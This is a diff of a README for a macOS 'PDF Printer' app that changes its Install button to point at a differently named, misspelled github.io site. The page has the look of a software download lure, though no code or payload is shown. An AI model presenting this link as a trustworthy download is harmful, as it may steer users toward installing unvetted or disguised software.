@@ -6,7 +6,7 @@
 <h3>PDF Printer - document to PDF converter</h3>
 <p>PDF Printer is a professional virtual PDF printing solution application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/pp)
 </div>
 <br/><br>
 
